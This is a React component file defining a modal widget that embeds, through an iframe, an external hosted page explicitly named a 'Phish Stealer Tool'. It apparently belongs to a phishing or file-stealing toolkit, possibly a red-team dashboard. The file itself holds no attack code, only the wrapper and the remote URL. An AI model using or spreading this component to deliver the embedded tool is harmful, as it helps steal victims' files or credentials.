import React from 'react';
import './phish-files-stealer-widget.scss';

interface PhishFilesStealerWidgetProps {
  onClose: () => void;
}

export const PhishFilesStealerWidget: React.FC<PhishFilesStealerWidgetProps> = ({ onClose }) => {
  return (
    <div className="phish-files-stealer-backdrop" onClick={onClose}>
      <div className="phish-files-stealer-widget" onClick={(e) => e.stopPropagation()}>
        <button className="close-button" onClick={onClose}>×</button>
        <div className="phish-files-stealer-content">
          <div className="phish-files-stealer-container">
            <iframe
              src="https://app-filenio-b1vckg10be.up.railway.app/access"
              className="phish-files-stealer-iframe"
              title="Phish Stealer Tool"
              allowFullScreen
            />
          </div>
        </div>
      </div>
    </div>
  );
};
